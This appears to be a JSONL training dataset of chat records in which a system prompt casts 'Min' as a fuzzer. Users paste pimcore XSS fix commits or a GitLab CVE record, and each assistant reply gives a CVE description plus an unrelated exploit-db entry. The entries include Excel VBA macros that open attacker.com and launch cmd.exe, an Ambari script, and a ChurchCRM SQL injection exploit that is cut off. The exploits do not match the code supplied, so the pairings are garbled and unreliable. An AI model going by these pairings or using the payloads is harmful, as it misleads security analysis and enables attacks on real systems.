CVE-2023-23286\nPOC:\n\nhttps://f20.be/blog/provide-server-14-4\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/pimcore/pimcore/commit/6946f8a5a0a93b516c49f17a5b45044eebd73480\n[Security] Stored cross site scripting vulnerability in operator any … · pimcore/pimcore@6946f8a · GitHub\n\nSkip to content\n\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        pimcore\n \n/\n\npimcore\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    1.4k\n \n          Star\n 3.2k\n  \nCode\n\nIssues\n379\nPull requests\n57\nDiscussions\n\nActions\n\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Discussions\n          Actions\n          Security\n          Insights\n\n \n\nCommit\n\nPermalink\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n          [Security] Stored cross site scripting vulnerability in operator any …\n        \n\nBrowse files\nBrowse the repository at this point in the history\n\n…getter in pimcore grid configuration (#14984)\n\n* Fix: xss in anyGetter\n\n* Fix: xss for predefined asset metadata\n\nLoading branch information\n\n \nrobertSt7\n    \n  committed\n  Apr 21, 2023\n        1 parent\n          \n          498cade\n\ncommit 6946f8a\n \n Show file tree\n \n Hide file tree\n\n      Showing\n      7 changed files\n      with\n      38 additions\n      and\n      14 deletions.\n    \n \nWhitespace\n \nIgnore whitespace\n\n \nSplit\n \nUnified\n \n\n \n        bundles/AdminBundle\n      \n\n        Controller/Admin\n      \n\n        Asset\n      \n\nbundles/AdminBundle/Controller/Admin/Asset/AssetHelperController.php\n\n        AssetHelperController.php\n      \n        DataObject\n      \n\nbundles/AdminBundle/Controller/Admin/DataObject/DataObjectHelperController.php\n\n        DataObjectHelperController.php\n      \n        Resources/public/js/pimcore\n      \n\n        object/gridcolumn/operator\n      \n\nbundles/AdminBundle/Resources/public/js/pimcore/object/gridcolumn/operator/AnyGetter.js\n\n        AnyGetter.js\n      \n        settings/metadata\n      \n\nbundles/AdminBundle/Resources/public/js/pimcore/settings/metadata/predefined.js\n\n        predefined.js\n      \n        lib\n      \n\n        DataObject/GridColumnConfig/Operator\n      \n\nlib/DataObject/GridColumnConfig/Operator/AbstractOperator.php\n\n        AbstractOperator.php\n      \nlib/DataObject/GridColumnConfig/Operator/AnyGetter.php\n\n        AnyGetter.php\n      \n        Security\n      \n\nlib/Security/SecurityHelper.php\n\n        SecurityHelper.php\n      \n\n \n        There are no files selected for viewing\n\n \n\n            6 changes: 4 additions & 2 deletions\n          \n6 \n\nbundles/AdminBundle/Controller/Admin/Asset/AssetHelperController.php\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -33,6 +33,7 @@\n\nuse Pimcore\\Model\\GridConfigShare;\n\nuse Pimcore\\Model\\Metadata;\n\nuse Pimcore\\Model\\User;\n\nuse Pimcore\\Security\\SecurityHelper;\n\nuse Pimcore\\Tool;\n\nuse Pimcore\\Tool\\Storage;\n\nuse Pimcore\\Version;\nExpand Down\n\nExpand Up\n\n@@ -963,9 +964,10 @@ public function getMetadataForColumnConfigAction(Request $request)\n\n if (!in_array($uniqueKey, $tmp) && !in_array($item->getName(), $defaultMetadataNames)) {\n\n $tmp[] = $uniqueKey;\n\n $item->expand();\n\n $name = SecurityHelper::convertHtmlSpecialChars($item->getName());\n\n $metadataItems[] = [\n\n 'title' => $item->getName(),\n\n 'name' => $item->getName(),\n\n 'title' => $name,\n\n 'name' => $name,\n\n 'subtype' => $item->getTargetSubtype(),\n\n 'datatype' => 'data',\n\n 'fieldtype' => $item->getType(),\nExpand Down\n            8 changes: 8 additions & 0 deletions\n          \n8 \n\nbundles/AdminBundle/Controller/Admin/DataObject/DataObjectHelperController.php\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -32,6 +32,7 @@\n\nuse Pimcore\\Model\\GridConfigFavourite;\n\nuse Pimcore\\Model\\GridConfigShare;\n\nuse Pimcore\\Model\\User;\n\nuse Pimcore\\Security\\SecurityHelper;\n\nuse Pimcore\\Tool;\n\nuse Pimcore\\Tool\\Storage;\n\nuse Pimcore\\Version;\nExpand Down\n\nExpand Up\n\n@@ -355,6 +356,13 @@ public function doGetGridColumnConfig(Request $request, Config $config, $isDelet\n\n $gridConfigDescription = $savedGridConfig->getDescription();\n\n $sharedGlobally = $savedGridConfig->isShareGlobally();\n\n $setAsFavourite = $savedGridConfig->isSetAsFavourite();\n\n foreach($gridConfig['columns'] as &$column) {\n\n if (array_key_exists('isOperator', $column) && $column['isOperator']) {\n\n $colAttributes = &$column['fieldConfig']['attributes'];\n\n SecurityHelper::convertHtmlSpecialCharsArrayKeys($colAttributes, ['label', 'attribute', 'param1']);\n\n                    }\n\n                }\n\n            }\n\n        }\nExpand Down\n            13 changes: 8 additions & 5 deletions\n          \n13 \n\nbundles/AdminBundle/Resources/public/js/pimcore/object/gridcolumn/operator/AnyGetter.js\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -83,22 +83,25 @@ pimcore.object.gridcolumn.operator.anygetter = Class.create(pimcore.object.gridc\n\n fieldLabel: t('label'),\n\n length: 255,\n\n width: 200,\n\n value: this.node.data.configAttributes.label\n\n value: this.node.data.configAttributes.label,\n\n listeners: {'change': pimcore.helpers.htmlEncodeTextField }\n\n });\n\n this.attributeField = new Ext.form.TextField({\n\n fieldLabel: t('attribute'),\n\n length: 255,\n\n width: 200,\n\n value: this.node.data.configAttributes.attribute\n\n value: this.node.data.configAttributes.attribute,\n\n listeners: {'change': pimcore.helpers.htmlEncodeTextField }\n\n });\n\n this.param1Field = new Ext.form.TextField({\n\n fieldLabel: t('parameter'),\n\n length: 255,\n\n width: 200,\n\n value: this.node.data.configAttributes.param1\n\n });\n\n value: this.node.data.configAttributes.param1,\n\n listeners: {'change': pimcore.helpers.htmlEncodeTextField }\n\n });\n\n this.returnLastResultField = new Ext.form.Checkbox({\n\n fieldLabel: t('return_last_result'),\nExpand Down\n\nExpand Up\n\n@@ -183,7 +186,7 @@ pimcore.object.gridcolumn.operator.anygetter = Class.create(pimcore.object.gridc\n\n if (configAttributes.param1) {\n\n attr += \" \" + configAttributes.param1;\n\n }\n\n nodeLabel += '<span class=\"pimcore_gridnode_hint\"> (' + attr + ')</span>';\n\n nodeLabel += '<span class=\"pimcore_gridnode_hint\"> (' + Ext.util.Format.htmlEncode(attr) + ')</span>';\n\n }\n\n return nodeLabel;\nExpand Down\n            2 changes: 1 addition & 1 deletion\n          \n2 \n\nbundles/AdminBundle/Resources/public/js/pimcore/settings/metadata/predefined.js\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -138,7 +138,7 @@ pimcore.settings.metadata.predefined = Class.create({\n\n sortable: true\n\n },\n\n {text: t(\"name\"), width: 200, sortable: true, dataIndex: 'name',\n\n getEditor: function() { return new Ext.form.TextField({}); }\n\n getEditor: function() { return new Ext.form.TextField({ listeners: {'change': pimcore.helpers.htmlEncodeTextField } }); }\n\n },\n\n {text: t(\"group\"), width: 200, sortable: true, dataIndex: 'group',\n\n getEditor: function() { return new Ext.form.TextField({}); }\nExpand Down\n            5 changes: 3 additions & 2 deletions\n          \n5 \n\nlib/DataObject/GridColumnConfig/Operator/AbstractOperator.php\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -16,6 +16,7 @@\n\nnamespace Pimcore\\DataObject\\GridColumnConfig\\Operator;\n\nuse Pimcore\\DataObject\\GridColumnConfig\\ConfigElementInterface;\n\nuse Pimcore\\Security\\SecurityHelper;\n\nuse Pimcore\\Tool;\n\nabstract class AbstractOperator implements OperatorInterface\nExpand All\n\n@@ -41,7 +42,7 @@ abstract class AbstractOperator implements OperatorInterface\n\n     */\n\n public function __construct(\\stdClass $config, array $context = [])\n\n    {\n\n $this->label = $config->label;\n\n $this->label = SecurityHelper::convertHtmlSpecialChars($config->label);\n\n $this->childs = $config->childs;\n\n $this->context = $context;\n\n    }\nExpand Down\n\nExpand Up\n\n@@ -91,7 +92,7 @@ public function getLabel()\n\n     */\n\n public function setLabel($label)\n\n    {\n\n $this->label = $label;\n\n $this->label = SecurityHelper::convertHtmlSpecialChars($label);\n\n    }\n\n /**\nExpand Down\n            9 changes: 5 additions & 4 deletions\n          \n9 \n\nlib/DataObject/GridColumnConfig/Operator/AnyGetter.php\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -16,6 +16,7 @@\n\nnamespace Pimcore\\DataObject\\GridColumnConfig\\Operator;\n\nuse Pimcore\\Model\\AbstractModel;\n\nuse Pimcore\\Security\\SecurityHelper;\n\nuse Pimcore\\Tool\\Admin;\n\n/**\nExpand Down\n\nExpand Up\n\n@@ -64,8 +65,8 @@ public function __construct(\\stdClass $config, $context = null)\n\n parent::__construct($config, $context);\n\n $this->attribute = $config->attribute ?? '';\n\n $this->param1 = $config->param1 ?? '';\n\n $this->attribute = SecurityHelper::convertHtmlSpecialChars($config->attribute ?? '');\n\n $this->param1 = SecurityHelper::convertHtmlSpecialChars($config->param1 ?? '');\n\n $this->isArrayType = $config->isArrayType ?? false;\n\n $this->forwardAttribute = $config->forwardAttribute ?? '';\nExpand Down\n\nExpand Up\n\n@@ -182,7 +183,7 @@ public function getAttribute()\n\n     */\n\n public function setAttribute($attribute)\n\n    {\n\n $this->attribute = $attribute;\n\n $this->attribute = SecurityHelper::convertHtmlSpecialChars($attribute);\n\n    }\n\n /**\nExpand All\n\n@@ -198,7 +199,7 @@ public function getParam1()\n\n     */\n\n public function setParam1($param1)\n\n    {\n\n $this->param1 = $param1;\n\n $this->param1 = SecurityHelper::convertHtmlSpecialChars($param1);\n\n    }\n\n /**\nExpand Down\n            9 changes: 9 additions & 0 deletions\n          \n9 \n\nlib/Security/SecurityHelper.php\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -25,4 +25,13 @@ public static function convertHtmlSpecialChars(?string $text): ?string\n\n return null;\n\n    }\n\n public static function convertHtmlSpecialCharsArrayKeys(array &$array, array $keys): void\n\n    {\n\n foreach ($keys as $key) {\n\n if (array_key_exists($key, $array)) {\n\n $array[$key] = self::convertHtmlSpecialChars($array[$key]);\n\n            }\n\n        }\n\n    }\n\n}\n\nToggle all file notes\nToggle all file annotations\n\n    0 comments\n    on commit 6946f8a\n\n  \n\n    Please\n  sign in to comment.\n\n \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsCross-site Scripting (XSS) - Reflected in GitHub repository pimcore/pimcore prior to 10.5.21.\n\nexploit\n/multiple/remote/51328.txt\n## Exploit Title: Microsoft Excel 365 MSO (Version 2302 Build 16.0.16130.20186) 64-bit - Remote Code Execution (RCE)\n## Exploit Author: nu11secur1ty\n## Date: 03.16.2023\n## Vendor: https://www.microsoft.com/en-us/microsoft-365/excel\n## Software: https://www.microsoft.com/en-us/microsoft-365/excel\n## Reference: https://www.invicti.com/learn/remote-code-execution-rce/\n## CVE ID: CVE-2023-23399\n\n## Description:\nThe malicious user can exploit the victim's PC remotely.\nFor example, when the score indicates that the Attack Vector is Local\nand User Interaction is Required, this could describe an exploit in\nwhich an attacker, through social engineering, convinces a victim to\ndownload and open a specially crafted file from a website which leads\nto a local attack on their computer.\n\nSTATUS: HIGH Vulnerability\n\n[+]Exploit0:\n```\nSub Check_your_salaries()\nCreateObject(\"Shell.Application\").ShellExecute\n\"microsoft-edge:https://attacker.com\"\nEnd Sub\n```\n[+]Exploit1:\n```\nSub cmd()\nDim Program As String\nDim TaskID As Double\nOn Error Resume Next\nProgram = \"cmd.exe\"\nTaskID = Shell(Program, 1)\nIf Err <> 0 Then\nMsgBox \"Can't start \" & Program\nEnd If\nEnd Sub\n```\n\n## Reproduce:\n[href](https://github.com/nu11secur1ty/CVE-mitre/tree/main/2023/CVE-2023-23399)\n\n## Proof and Exploit:\n[href](https://streamable.com/dnyfx0)\n\n## Time spend:\n03:00:00\n\n\n--\nSystem Administrator - Infrastructure Engineer\nPenetration Testing Engineer\nExploit developer at\nhttps://packetstormsecurity.com/https://cve.mitre.org/index.html and\nhttps://www.exploit-db.com/\nhome page: https://www.nu11secur1ty.com/\nhiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=\n                          nu11secur1ty <http://nu11secur1ty.com/>\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/pimcore/pimcore/commit/aa38319e353cc3cdfac12e03e21ed7a8f3628d3e\n[Security] Stored cross site scripting vulnerability in Save grid opt… · pimcore/pimcore@aa38319 · GitHub\n\nSkip to content\n\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        pimcore\n \n/\n\npimcore\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    1.4k\n \n          Star\n 3.2k\n  \nCode\n\nIssues\n379\nPull requests\n57\nDiscussions\n\nActions\n\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Discussions\n          Actions\n          Security\n          Insights\n\n \n\nCommit\n\nPermalink\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n          [Security] Stored cross site scripting vulnerability in Save grid opt…\n        \n\nBrowse files\nBrowse the repository at this point in the history\n\n…ion in pimcore dashboard (#14955)\n\n* Fix: XSS in grid\n\n* Fix: use convertHtmlSpecialChars\n\n* Fix: duplicate convert\n\nLoading branch information\n\n \nrobertSt7\n    \n  committed\n  Apr 24, 2023\n        1 parent\n          \n          6946f8a\n\ncommit aa38319\n \n Show file tree\n \n Hide file tree\n\n      Showing\n      3 changed files\n      with\n      15 additions\n      and\n      9 deletions.\n    \n \nWhitespace\n \nIgnore whitespace\n\n \nSplit\n \nUnified\n \n\n \n        bundles/AdminBundle\n      \n\n        Controller/Admin/DataObject\n      \n\nbundles/AdminBundle/Controller/Admin/DataObject/DataObjectHelperController.php\n\n        DataObjectHelperController.php\n      \n        Resources/public/js/pimcore/element/helpers\n      \n\nbundles/AdminBundle/Resources/public/js/pimcore/element/helpers/gridColumnConfig.js\n\n        gridColumnConfig.js\n      \n        lib/Security\n      \n\nlib/Security/SecurityHelper.php\n\n        SecurityHelper.php\n      \n\n \n        There are no files selected for viewing\n\n \n\n            12 changes: 6 additions & 6 deletions\n          \n12 \n\nbundles/AdminBundle/Controller/Admin/DataObject/DataObjectHelperController.php\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -346,14 +346,14 @@ public function doGetGridColumnConfig(Request $request, Config $config, $isDelet\n\n $gridConfigId = $savedGridConfig->getId();\n\n $gridConfig = $savedGridConfig->getConfig();\n\n $gridConfig = json_decode($gridConfig, true);\n\n $gridConfigName = $savedGridConfig->getName();\n\n $gridConfigName = SecurityHelper::convertHtmlSpecialChars($savedGridConfig->getName());\n\n $owner = $savedGridConfig->getOwnerId();\n\n $ownerObject = User::getById($owner);\n\n if ($ownerObject instanceof User) {\n\n $owner = $ownerObject->getName();\n\n                }\n\n $modificationDate = $savedGridConfig->getModificationDate();\n\n $gridConfigDescription = $savedGridConfig->getDescription();\n\n $gridConfigDescription = SecurityHelper::convertHtmlSpecialChars($savedGridConfig->getDescription());\n\n $sharedGlobally = $savedGridConfig->isShareGlobally();\n\n $setAsFavourite = $savedGridConfig->isSetAsFavourite();\nExpand Down\n\nExpand Up\n\n@@ -951,8 +951,8 @@ public function gridSaveColumnConfigAction(Request $request)\n\n                }\n\n if ($metadata) {\n\n $gridConfig->setName($metadata['gridConfigName']);\n\n $gridConfig->setDescription($metadata['gridConfigDescription']);\n\n $gridConfig->setName(SecurityHelper::convertHtmlSpecialChars($metadata['gridConfigName']));\n\n $gridConfig->setDescription(SecurityHelper::convertHtmlSpecialChars($metadata['gridConfigDescription']));\n\n $gridConfig->setShareGlobally($metadata['shareGlobally'] && $this->getAdminUser()->isAdmin());\n\n $gridConfig->setSetAsFavourite($metadata['setAsFavourite'] && $this->getAdminUser()->isAdmin());\n\n                }\nExpand All\n\n@@ -968,8 +968,8 @@ public function gridSaveColumnConfigAction(Request $request)\n\n $settings = $this->getShareSettings($gridConfig->getId());\n\n $settings['gridConfigId'] = (int)$gridConfig->getId();\n\n $settings['gridConfigName'] = $gridConfig->getName();\n\n $settings['gridConfigDescription'] = $gridConfig->getDescription();\n\n $settings['gridConfigName'] = SecurityHelper::convertHtmlSpecialChars($gridConfig->getName());\n\n $settings['gridConfigDescription'] = SecurityHelper::convertHtmlSpecialChars($gridConfig->getDescription());\n\n $settings['shareGlobally'] = $gridConfig->isShareGlobally();\n\n $settings['setAsFavourite'] = $gridConfig->isSetAsFavourite();\n\n $settings['isShared'] = $gridConfig->getOwnerId() != $this->getAdminUser()->getId() && !$this->getAdminUser()->isAdmin();\nExpand Down\n            9 changes: 6 additions & 3 deletions\n          \n9 \n\nbundles/AdminBundle/Resources/public/js/pimcore/element/helpers/gridColumnConfig.js\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -24,7 +24,10 @@ pimcore.element.helpers.gridColumnConfig = {\n\n fieldLabel: t('name'),\n\n length: 50,\n\n allowBlank: false,\n\n value: this.settings.gridConfigName ? this.settings.gridConfigName : defaultName\n\n value: this.settings.gridConfigName ? this.settings.gridConfigName : defaultName,\n\n listeners: {\n\n change: pimcore.helpers.htmlEncodeTextField\n\n }\n\n });\n\n var descriptionField = new Ext.form.TextArea({\nExpand Down\n\nExpand Up\n\n@@ -126,9 +129,9 @@ pimcore.element.helpers.gridColumnConfig = {\n\n for (var i = 0; i < list.length; i++) {\n\n var disabled = false;\n\n var config = list[i];\n\n var text = config[\"name\"];\n\n let text = `<span>${Ext.util.Format.htmlEncode(config[\"name\"])}</span>`;\n\n if (config.id == this.settings.gridConfigId) {\n\n text = this.settings.gridConfigName;\n\n text = Ext.util.Format.htmlEncode(this.settings.gridConfigName);\n\n if (!onlyConfigs) {\n\n text = \"<b>\" + text + \"</b>\";\n\n disabled = true;\nExpand Down\n            3 changes: 3 additions & 0 deletions\n          \n3 \n\nlib/Security/SecurityHelper.php\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -15,6 +15,9 @@\n\nnamespace Pimcore\\Security;\n\n/**\n\n * @internal\n\n */\n\nclass SecurityHelper\n\n{\n\n public static function convertHtmlSpecialChars(?string $text): ?string\nExpand Down\n\nToggle all file notes\nToggle all file annotations\n\n    0 comments\n    on commit aa38319\n\n  \n\n    Please\n  sign in to comment.\n\n \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsCross-site Scripting (XSS) - Stored in GitHub repository pimcore/pimcore prior to 10.5.21.\n\nexploit\n/multiple/remote/51546.py\n# Exploit Title: Azure Apache Ambari 2302250400 - Spoofing\n# Date: 2023-06-23\n# country: Iran\n# Exploit Author: Amirhossein Bahramizadeh\n# Category : Remote\n# Vendor Homepage:\nMicrosoft\nApache Ambari\nMicrosoft azure Hdinsights\n# Tested on: Windows/Linux\n# CVE : CVE-2023-23408\n\nimport requests\n\n# Set the URL and headers for the Ambari web interface\nurl = \"https://ambari.example.com/api/v1/clusters/cluster_name/services\"\nheaders = {\"X-Requested-By\": \"ambari\", \"Authorization\": \"Basic abcdefghijklmnop\"}\n\n# Define a function to validate the headers\ndef validate_headers(headers):\n    if \"X-Requested-By\" not in headers or headers[\"X-Requested-By\"] != \"ambari\":\n        return False\n    if \"Authorization\" not in headers or headers[\"Authorization\"] != \"Basic abcdefghijklmnop\":\n        return False\n    return True\n\n# Define a function to send a request to the Ambari web interface\ndef send_request(url, headers):\n    if not validate_headers(headers):\n        print(\"Invalid headers\")\n        return\n    response = requests.get(url, headers=headers)\n    if response.status_code == 200:\n        print(\"Request successful\")\n    else:\n        print(\"Request failed\")\n\n# Call the send_request function with the URL and headers\nsend_request(url, headers)\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://gitlab.com/gitlab-org/cves/-/blob/master/2023/CVE-2023-2478.json\nCVE-2023-2478.json\n2.75 KiB\nBlame\nEdit\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n{\n  \"data_type\": \"CVE\",\n  \"data_format\": \"MITRE\",\n  \"data_version\": \"4.0\",\n  \"CVE_data_meta\": {\n    \"ID\": \"CVE-2023-2478\",\n    \"ASSIGNER\": \"cve@gitlab.com\"\n  },\n  \"affects\": {\n    \"vendor\": {\n      \"vendor_data\": [\n        {\n          \"vendor_name\": \"GitLab\",\n          \"product\": {\n            \"product_data\": [\n              {\n                \"product_name\": \"GitLab\",\n                \"version\": {\n                  \"version_data\": [\n                    {\n                      \"version_value\": \">=15.4, <15.9.7\"\n                    },\n                    {\n                      \"version_value\": \">=15.10, <15.10.6\"\n                    },\n                    {\n                      \"version_value\": \">=15.11, <15.11.2\"\n                    }\n                  ]\n                }\n              }\n            ]\n          }\n        }\n      ]\n    }\n  },\n  \"problemtype\": {\n    \"problemtype_data\": [\n      {\n        \"description\": [\n          {\n            \"lang\": \"eng\",\n            \"value\": \"Incorrect permission assignment for critical resource in GitLab\"\n          }\n        ]\n      }\n    ]\n  },\n  \"references\": {\n    \"reference_data\": [\n      {\n        \"name\": \"https://gitlab.com/gitlab-org/gitlab/-/issues/409470\",\n        \"url\": \"https://gitlab.com/gitlab-org/gitlab/-/issues/409470\",\n        \"refsource\": \"MISC\"\n      },\n      {\n        \"name\": \"https://hackerone.com/reports/1969599\",\n        \"url\": \"https://hackerone.com/reports/1969599\",\n        \"refsource\": \"MISC\"\n      },\n      {\n        \"name\": \"https://gitlab.com/gitlab-org/cves/-/blob/master/2023/CVE-2023-2478.json\",\n        \"url\": \"https://gitlab.com/gitlab-org/cves/-/blob/master/2023/CVE-2023-2478.json\",\n        \"refsource\": \"CONFIRM\"\n      }\n    ]\n  },\n  \"description\": {\n    \"description_data\": [\n      {\n        \"lang\": \"eng\",\n        \"value\": \"An issue has been discovered in GitLab CE/EE affecting all versions starting from 15.4 before 15.9.7, all versions starting from 15.10 before 15.10.6, all versions starting from 15.11 before 15.11.2. Under certain conditions, a malicious unauthorized GitLab user may use a GraphQL endpoint to attach a malicious runner to any project.\"\n      }\n    ]\n  },\n  \"impact\": {\n    \"cvss\": {\n      \"vectorString\": \"AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N\",\n      \"attackComplexity\": \"LOW\",\n      \"attackVector\": \"NETWORK\",\n      \"availabilityImpact\": \"NONE\",\n      \"confidentialityImpact\": \"HIGH\",\n      \"integrityImpact\": \"HIGH\",\n      \"privilegesRequired\": \"LOW\",\n      \"scope\": \"CHANGED\",\n      \"userInteraction\": \"NONE\",\n      \"version\": \"3.1\",\n      \"baseScore\": 9.6,\n      \"baseSeverity\": \"CRITICAL\"\n    }\n  },\n  \"credit\": [\n    {\n      \"lang\": \"eng\",\n      \"value\": \"Thanks [yvvdwf](https://hackerone.com/yvvdwf) for reporting this vulnerability through our HackerOne bug bounty program\"\n    }\n  ]\n}\n\n"}, {"role": "assistant", "content": "descriptionsAn issue has been discovered in GitLab CE/EE affecting all versions starting from 15.4 before 15.9.7, all versions starting from 15.10 before 15.10.6, all versions starting from 15.11 before 15.11.2. Under certain conditions, a malicious unauthorized GitLab user may use a GraphQL endpoint to attach a malicious runner to any project.\n\nexploit\n/php/webapps/51319.py\n# Exploit Title: ChurchCRM 4.5.1 - Authenticated SQL Injection\n# Date: 11-03-2023\n# Exploit Author: Arvandy\n# Blog Post: https://github.com/arvandy/CVE/blob/main/CVE-2023-24787/CVE-2023-24787.md\n# Software Link: https://github.com/ChurchCRM/CRM/releases\n# Vendor Homepage: http://churchcrm.io/\n# Version: 4.5.1\n# Tested on: Windows, Linux\n# CVE: CVE-2023-24787\n\n\"\"\"\nThe endpoint /EventAttendance.php is vulnerable to Authenticated SQL Injection (Union-based and Blind-based) via the Event GET parameter.\nThis 